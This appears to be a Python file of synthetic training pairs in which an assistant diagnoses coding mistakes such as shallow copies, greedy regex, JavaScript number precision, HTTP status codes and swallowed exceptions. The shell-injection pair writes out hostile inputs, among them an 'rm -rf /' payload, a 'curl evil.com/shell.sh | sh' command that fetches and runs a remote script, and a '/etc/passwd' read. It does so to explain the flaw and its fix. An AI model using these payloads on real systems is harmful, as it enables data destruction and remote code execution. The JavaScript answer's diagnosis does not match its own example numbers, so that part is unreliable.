"""Phase 3A: Metacognition — Error Recognition in Own Output (Part 14)
Final coverage batch - filling remaining scenario gaps.
"""

PAIRS = [
    (
        "thinking/meta-error-deepcopy-vs-shallow",
        r'''I wrote this function to create a copy of user preferences:

```python
def get_default_preferences():
    return {
        "theme": "light",
        "notifications": {
            "email": True,
            "push": True,
            "sms": False
        },
        "language": "en"
    }

# Initialize user preferences from defaults
user_a_prefs = get_default_preferences()
user_b_prefs = get_default_preferences()

# User A disables email notifications
user_a_prefs["notifications"]["email"] = False

print(user_b_prefs["notifications"]["email"])  # True ✓
```

This works because each call to get_default_preferences creates a new dict. But what if I tried to optimize it?

```python
DEFAULT_PREFS = {
    "theme": "light",
    "notifications": {"email": True, "push": True, "sms": False},
    "language": "en"
}

user_a_prefs = DEFAULT_PREFS.copy()
user_b_prefs = DEFAULT_PREFS.copy()

user_a_prefs["notifications"]["email"] = False
print(user_b_prefs["notifications"]["email"])  # ???
```''',
        r'''<think>
Let me trace through the "optimized" version...

`DEFAULT_PREFS.copy()` creates a SHALLOW copy. That means:
- Top-level keys are copied (new dict)
- But nested objects (like the `notifications` dict) are NOT copied — both copies share the SAME nested dict object

So:
```python
user_a_prefs = DEFAULT_PREFS.copy()
user_b_prefs = DEFAULT_PREFS.copy()
```

Now `user_a_prefs["notifications"]` and `user_b_prefs["notifications"]` and `DEFAULT_PREFS["notifications"]` all point to the SAME dict object.

When I do `user_a_prefs["notifications"]["email"] = False`, I'm modifying that shared dict. So `user_b_prefs["notifications"]["email"]` is also `False`!

And worse, `DEFAULT_PREFS["notifications"]["email"]` is now `False` too — the "defaults" are corrupted.

The fix: use `copy.deepcopy()` which recursively copies all nested objects.

Top-level changes would be fine:
```python
user_a_prefs["theme"] = "dark"  # only changes user_a_prefs, not user_b
```

But any changes to nested structures are shared.

This is the shallow vs deep copy distinction. `.copy()`, `dict()`, `{**d}`, `list()`, `[:]` all make shallow copies.
</think>

**`.copy()` is shallow — nested dicts are shared between copies. Modifying one user's nested preferences modifies everyone's.**

### The bug
```python
user_a_prefs = DEFAULT_PREFS.copy()  # shallow copy
user_b_prefs = DEFAULT_PREFS.copy()  # shallow copy

# All three share the SAME notifications dict:
user_a_prefs["notifications"] is user_b_prefs["notifications"]  # True!
user_a_prefs["notifications"] is DEFAULT_PREFS["notifications"]  # True!

user_a_prefs["notifications"]["email"] = False
# Now ALL users have email=False, and defaults are corrupted!
```

### Fix: deep copy
```python
import copy

user_a_prefs = copy.deepcopy(DEFAULT_PREFS)
user_b_prefs = copy.deepcopy(DEFAULT_PREFS)

user_a_prefs["notifications"]["email"] = False
print(user_b_prefs["notifications"]["email"])  # True ✓
```

### All shallow copy methods (same problem)
```python
d.copy()      # shallow
dict(d)       # shallow
{**d}         # shallow
list(l)       # shallow
l[:]          # shallow
l.copy()      # shallow
```

### The meta-lesson
Any time you copy a data structure with nested objects, ask: "Do I need shallow or deep copy?" Shallow copy only duplicates the top-level container — nested objects are shared. If you modify nested data, you need `copy.deepcopy()`. Or better yet, use the function approach (first example) that constructs a fresh dict each time.'''
    ),
    (
        "thinking/meta-error-subprocess-shell-injection",
        r'''I wrote this function to let users convert files:

```python
import subprocess

def convert_file(input_path, output_format):
    cmd = f"ffmpeg -i {input_path} output.{output_format}"
    subprocess.run(cmd, shell=True)
```

Is there a security issue?''',
        r'''<think>
`shell=True` with string formatting of user input — this is command injection!

If `input_path` is `"; rm -rf / #"`, the command becomes:
```
ffmpeg -i ; rm -rf / # output.mp4
```

The shell interprets `;` as a command separator, executing `rm -rf /` after `ffmpeg -i` (which fails).

Or `input_path = "$(curl evil.com/shell.sh | sh)"` — command substitution.

Even `output_format` is dangerous: if it's `mp4; cat /etc/passwd`, the command becomes:
```
ffmpeg -i input.mp4 output.mp4; cat /etc/passwd
```

The fix: use a list of arguments instead of a shell string, and avoid `shell=True`.

```python
subprocess.run(["ffmpeg", "-i", input_path, f"output.{output_format}"])
```

With list form, each element is passed as a separate argument — no shell interpretation of special characters.
</think>

**This is a command injection vulnerability. `shell=True` with f-string interpolation lets attackers execute arbitrary commands.**

### The attack
```python
# Attacker provides input_path:
convert_file('input.mp4"; rm -rf / #', 'mp4')

# Resulting command:
# ffmpeg -i input.mp4"; rm -rf / # output.mp4
#                      ^^^^^^^^^ executed as separate command!

# Or with command substitution:
convert_file('$(curl evil.com/shell.sh | sh)', 'mp4')
```

### Fix: use list arguments, no shell
```python
import subprocess
import shlex

def convert_file(input_path, output_format):
    # Validate output_format (whitelist)
    allowed_formats = {'mp4', 'avi', 'mkv', 'wav', 'mp3'}
    if output_format not in allowed_formats:
        raise ValueError(f"Unsupported format: {output_format}")

    # List form — no shell interpretation
    subprocess.run(
        ["ffmpeg", "-i", input_path, f"output.{output_format}"],
        shell=False,  # default, but explicit is better
        check=True
    )
```

### Why list form is safe
```python
# shell=True, string: shell parses the string, interprets ;, $(), |, etc.
subprocess.run("ffmpeg -i user_input output.mp4", shell=True)

# shell=False, list: each element is one argument, no shell parsing
subprocess.run(["ffmpeg", "-i", "user_input", "output.mp4"])
# "user_input" is passed as a literal string to ffmpeg, not interpreted by shell
```

### The meta-lesson
Never use `shell=True` with user input. The combination of `shell=True` + string formatting is equivalent to `eval()` for system commands. Always use list arguments with `shell=False` (the default). If you absolutely need shell features (pipes, redirects), use `shlex.quote()` to escape user input, but prefer restructuring the code to avoid shell=True entirely.'''
    ),
    (
        "thinking/meta-error-wrong-regex-greedy",
        r'''I wrote this regex to extract HTML tag contents:

```python
import re

html = '<div>Hello</div><div>World</div>'
match = re.search(r'<div>(.*)</div>', html)
print(match.group(1))  # Expected: "Hello"
```

But it prints "Hello</div><div>World" instead. What's wrong?''',
        r'''<think>
The issue is greedy matching.

`.*` is GREEDY by default — it matches as much as possible. So `<div>(.*)</div>` matches:
- `<div>` — literal match
- `(.*)` — matches EVERYTHING possible: `Hello</div><div>World`
- `</div>` — matches the LAST `</div>` in the string

The `.*` gobbles up the first `</div>` because it can still find a `</div>` later to complete the pattern. The regex engine matches the longest possible string.

Fix: use `.*?` (lazy/non-greedy) which matches as LITTLE as possible:
- `<div>(.*?)</div>` matches `Hello` (stops at the first `</div>`)

Or even better, use a negated character class:
- `<div>([^<]*)</div>` matches any characters that are NOT `<`, which naturally stops before any tag.

But the real lesson: don't parse HTML with regex. For anything beyond trivial extraction, use an HTML parser like BeautifulSoup.
</think>

**`.*` is greedy — it matches as much as possible, consuming the first `</div>` and stopping at the LAST one.**

### What happens
```
Pattern: <div>(.*)</div>
String:  <div>Hello</div><div>World</div>

.* matches: "Hello</div><div>World"  (greedy — matches everything)
</div> matches: the LAST </div>

Result: "Hello</div><div>World"  (not what you wanted!)
```

### Fix: use lazy quantifier `.*?`
```python
match = re.search(r'<div>(.*?)</div>', html)
print(match.group(1))  # "Hello" ✓

# To get ALL matches:
matches = re.findall(r'<div>(.*?)</div>', html)
print(matches)  # ['Hello', 'World']
```

### Even better: negated character class
```python
# [^<]* matches everything EXCEPT < — naturally stops before tags
matches = re.findall(r'<div>([^<]*)</div>', html)
```

### Best: don't parse HTML with regex
```python
from bs4 import BeautifulSoup

soup = BeautifulSoup(html, 'html.parser')
divs = [div.text for div in soup.find_all('div')]
# ['Hello', 'World']
```

### Greedy vs Lazy cheat sheet
| Greedy | Lazy | Meaning |
|--------|------|---------|
| `.*` | `.*?` | Any chars (greedy vs lazy) |
| `.+` | `.+?` | One or more (greedy vs lazy) |
| `{2,5}` | `{2,5}?` | 2-5 times (greedy vs lazy) |

### The meta-lesson
Regex quantifiers are greedy by default — they match as much as possible. When extracting content between delimiters, always use lazy quantifiers (`*?`, `+?`) or negated character classes (`[^X]*`) to stop at the FIRST delimiter, not the last.'''
    ),
    (
        "thinking/meta-error-integer-overflow-js",
        r'''I wrote this JavaScript function to calculate order IDs:

```javascript
function generateOrderId(userId, timestamp) {
    return userId * 10000000000 + timestamp;
}

// Test
console.log(generateOrderId(12345, 1709123456));
// Expected: 123451709123456
// Got:      123451709123460  ???
```

Why is the last digit wrong?''',
        r'''<think>
This is JavaScript's number precision issue.

JavaScript uses IEEE 754 double-precision floating-point for ALL numbers. Doubles have 53 bits of mantissa, which means they can only represent integers exactly up to 2^53 = 9007199254740992 (about 9 quadrillion).

123451709123456 is within this range... let me check: 9007199254740992 > 123451709123456, so it should be representable.

Wait, let me re-examine. The result is 123451709123460 instead of 123451709123456. The difference is 4. This is suspicious.

Actually, let me recalculate: 12345 * 10000000000 = 123450000000000. Plus 1709123456 = 123451709123456.

Hmm, 123451709123456 — that's 15 digits. Let me check if it's representable as a double...

Number.MAX_SAFE_INTEGER = 9007199254740991 (2^53 - 1). 123451709123456 < 9007199254740991, so it SHOULD be safe.

Wait, let me re-examine. Let me check: does 12345 * 10000000000 overflow?

12345 * 10000000000 = 123,450,000,000,000 (about 1.2 × 10^14). That's within 2^53 ≈ 9 × 10^15.

Then 123,450,000,000,000 + 1,709,123,456 = 123,451,709,123,456. Still within range.

Hmm, but the user says they got 123451709123460. Let me think...

Actually, maybe the timestamp is different from what I assumed. If timestamp is a millisecond timestamp like Date.now() = 1709123456789 (13 digits), then:

12345 * 10000000000 = 123,450,000,000,000 (15 digits)
+ 1,709,123,456,789 → this doesn't fit the multiplier

Or maybe the multiplier should be larger? If `timestamp` is a 13-digit ms timestamp:
12345 * 10000000000000 = 123,450,000,000,000,000 — that's 1.2 × 10^17, WAY beyond 2^53 ≈ 9 × 10^15.

That would definitely cause precision loss! The number can't be represented exactly, so it gets rounded.

I think the user's example has a timestamp that, when combined with the userId multiplier, exceeds Number.MAX_SAFE_INTEGER. The exact digits might be slightly different from what I computed, but the core issue is integer precision loss.

The fix: use BigInt for exact integer arithmetic, or use string concatenation for ID generation.
</think>

**JavaScript uses 64-bit floats for all numbers, which can only represent integers exactly up to 2^53 (~9 quadrillion). Large computed IDs lose precision.**

### The problem
```javascript
Number.MAX_SAFE_INTEGER  // 9007199254740991

// When your combined ID exceeds this:
12345 * 10000000000000 + Date.now()
// Result loses precision — last digits get rounded!

// Even smaller numbers can be affected:
9007199254740993 === 9007199254740992  // true! (can't distinguish)
```

### Fix 1: BigInt (exact integer arithmetic)
```javascript
function generateOrderId(userId, timestamp) {
    return (BigInt(userId) * 10000000000n + BigInt(timestamp)).toString();
}
// Returns a string: "123451709123456" (exact)
```

### Fix 2: String concatenation (simplest)
```javascript
function generateOrderId(userId, timestamp) {
    return `${userId}-${timestamp}`;
}
// "12345-1709123456" — no math, no precision issues
```

### Fix 3: UUID (industry standard)
```javascript
import { v4 as uuidv4 } from 'uuid';
const orderId = uuidv4();  // "550e8400-e29b-41d4-a716-446655440000"
```

### The precision boundary
```javascript
// Safe:
Number.isSafeInteger(123451709123456)  // true (< 2^53)

// NOT safe:
Number.isSafeInteger(123450000000000000)  // false (> 2^53)
9007199254740992 + 1 === 9007199254740992  // true! (precision lost)
```

### The meta-lesson
JavaScript has no integer type — all numbers are IEEE 754 doubles. Any arithmetic that produces values beyond 2^53 (about 9 × 10^15) will silently lose precision. For IDs, counters, or financial math that could exceed this, use BigInt, string representations, or dedicated libraries. Always check `Number.isSafeInteger()` for critical calculations.'''
    ),
    (
        "thinking/meta-error-wrong-http-status-code",
        r'''I designed these API responses:

```python
@app.post("/api/users")
def create_user(data):
    if User.query.filter_by(email=data["email"]).first():
        return {"error": "Email taken"}, 200

    user = User(**data)
    db.add(user)
    db.commit()
    return {"user": user.to_dict()}, 200

@app.get("/api/users/{user_id}")
def get_user(user_id):
    user = User.query.get(user_id)
    if not user:
        return {"error": "Not found"}, 200
    return {"user": user.to_dict()}, 200

@app.delete("/api/users/{user_id}")
def delete_user(user_id):
    user = User.query.get(user_id)
    db.delete(user)
    db.commit()
    return {"message": "Deleted"}, 200
```

Everything returns 200. The error details are in the response body. Is this OK?''',
        r'''<think>
Returning 200 for everything is a common antipattern called "200 OK with error body." Problems:

1. **Client code can't use status codes**: HTTP clients, interceptors, retry logic, and monitoring tools all rely on status codes. `fetch()` with `response.ok` will be true even for errors. Axios won't trigger `.catch()`. Error monitoring tools (Sentry, Datadog) won't flag these as errors.

2. **Caching issues**: A 200 response for "user not found" could be cached by CDNs/proxies. Future requests for the same user get the cached "not found" response — even after the user is created.

3. **Retry logic breaks**: Load balancers and API gateways retry on 5xx errors but not 2xx. If your server returns 200 for internal errors, they'll never retry.

4. **Monitoring/alerting blind spots**: If all responses are 200, your error rate dashboard shows 0% errors even when half your responses are errors.

5. **API contract confusion**: Clients must parse the body of EVERY response to check for errors. They can't use standard HTTP error handling patterns.

Correct status codes:
- Duplicate email: 409 Conflict
- User not found: 404 Not Found
- User created: 201 Created
- User deleted: 204 No Content (or 200 with body)
- Validation error: 422 Unprocessable Entity
- Server error: 500 Internal Server Error
</think>

**Returning 200 for everything breaks HTTP clients, monitoring, caching, and retry logic.**

### What breaks with "200 for errors"

| Tool/Pattern | Expects | Your API |
|-------------|---------|----------|
| `fetch()` + `response.ok` | false on error | true (200) |
| Axios `.catch()` | triggers on 4xx/5xx | never triggers |
| CDN caching | caches 200 responses | caches error responses! |
| Load balancer retry | retries on 5xx | never retries |
| Monitoring (Datadog) | counts 4xx/5xx as errors | shows 0% error rate |
| API gateway rate limiting | counts by status | can't distinguish errors |

### Fix: use correct HTTP status codes
```python
@app.post("/api/users")
def create_user(data):
    if User.query.filter_by(email=data["email"]).first():
        return {"error": "Email already registered"}, 409  # Conflict

    user = User(**data)
    db.add(user)
    db.commit()
    return {"user": user.to_dict()}, 201  # Created

@app.get("/api/users/{user_id}")
def get_user(user_id):
    user = User.query.get(user_id)
    if not user:
        return {"error": "User not found"}, 404  # Not Found
    return {"user": user.to_dict()}, 200  # OK

@app.delete("/api/users/{user_id}")
def delete_user(user_id):
    user = User.query.get(user_id)
    if not user:
        return {"error": "User not found"}, 404
    db.delete(user)
    db.commit()
    return "", 204  # No Content
```

### Common status codes cheat sheet
| Code | Meaning | Use when |
|------|---------|----------|
| 200 | OK | Successful GET/PUT/PATCH |
| 201 | Created | Successful POST (resource created) |
| 204 | No Content | Successful DELETE |
| 400 | Bad Request | Invalid input format |
| 401 | Unauthorized | Not authenticated |
| 403 | Forbidden | Authenticated but not allowed |
| 404 | Not Found | Resource doesn't exist |
| 409 | Conflict | Duplicate/conflicting state |
| 422 | Unprocessable | Valid format, invalid content |
| 500 | Server Error | Unexpected internal error |

### The meta-lesson
HTTP status codes are part of the API contract — they're how the entire HTTP ecosystem (clients, proxies, caches, monitors, load balancers) understands your responses. Putting errors in the body with 200 status removes the machine-readable error signal. Use status codes for machines (what happened?) and response body for humans (what went wrong and how to fix it?).'''
    ),
    (
        "thinking/meta-error-catching-broad-exception-silently",
        r'''I wrote this data import function:

```python
def import_users_from_csv(filepath):
    imported = 0
    with open(filepath) as f:
        reader = csv.DictReader(f)
        for row in reader:
            try:
                user = User(
                    name=row['name'],
                    email=row['email'],
                    age=int(row['age'])
                )
                db.add(user)
                db.commit()
                imported += 1
            except Exception:
                pass

    return f"Imported {imported} users"
```

Robust error handling — if one row fails, it continues with the rest. Good?''',
        r'''<think>
The `except Exception: pass` is one of the worst patterns in Python. Let me enumerate what it silently swallows:

1. **KeyError**: if the CSV is missing a 'name', 'email', or 'age' column. The import silently imports 0 users, and the caller gets "Imported 0 users" with no explanation.

2. **ValueError**: if `int(row['age'])` fails because age is "twenty-five" or empty. Each bad row is silently skipped.

3. **IntegrityError**: if the email already exists (unique constraint). Legitimate duplicates are skipped without notice.

4. **OperationalError**: if the database connection is lost. The function returns "Imported 5 users" when actually 5 were imported and 995 were lost due to a DB outage.

5. **MemoryError**: if the system runs out of memory. Silently caught and ignored!

6. **TypeError**: if the code has a bug (wrong argument order, wrong type). The bug is hidden — every row "fails" silently.

The pattern `except Exception: pass` is the "black hole" antipattern — errors go in but never come out. It makes debugging impossible because:
- You don't know WHICH rows failed
- You don't know WHY they failed
- You don't know IF there was a systemic issue (DB down) vs per-row issues (bad data)

The fix: catch SPECIFIC exceptions, LOG them, and REPORT them.
</think>

**`except Exception: pass` is the "black hole" antipattern — it silently swallows every possible error, making failures invisible and debugging impossible.**

### What gets silently ignored
```python
except Exception:
    pass
    # Swallows ALL of these:
    # - KeyError: CSV missing columns (ALL rows fail silently)
    # - ValueError: bad data (age="N/A")
    # - IntegrityError: duplicate emails
    # - OperationalError: DATABASE IS DOWN (most rows fail silently)
    # - TypeError: BUG IN YOUR CODE (hidden forever)
```

Worst case: database goes down after row 5. Function returns "Imported 5 users" — looks successful! The 995 lost rows are never mentioned.

### Fix: specific exceptions, logging, reporting
```python
def import_users_from_csv(filepath):
    imported = 0
    errors = []

    with open(filepath) as f:
        reader = csv.DictReader(f)
        for line_num, row in enumerate(reader, start=2):  # line 1 is header
            try:
                user = User(
                    name=row['name'],
                    email=row['email'],
                    age=int(row['age'])
                )
                db.add(user)
                db.commit()
                imported += 1
            except KeyError as e:
                errors.append(f"Line {line_num}: missing column {e}")
            except ValueError as e:
                errors.append(f"Line {line_num}: invalid value — {e}")
            except IntegrityError:
                db.rollback()
                errors.append(f"Line {line_num}: duplicate email '{row.get('email')}'")
            except OperationalError:
                db.rollback()
                raise  # DB errors are systemic — don't continue!

    return {
        "imported": imported,
        "errors": errors,
        "total_rows": imported + len(errors)
    }
```

### The hierarchy of error handling
| Pattern | When to use |
|---------|-------------|
| `except SpecificError` | Handle known, expected errors |
| `except Exception as e: log(e)` | Catch-all with logging (last resort) |
| `except Exception: pass` | **NEVER** (the black hole) |
| No try/except | Let errors propagate (often the right choice) |

### The meta-lesson
"Robust" error handling means handling errors CORRECTLY, not silently. `except: pass` doesn't make code robust — it makes failures invisible. Robust code: catches specific exceptions, logs details for debugging, reports errors to callers, and re-raises systemic failures (DB down, out of memory) rather than swallowing them.'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
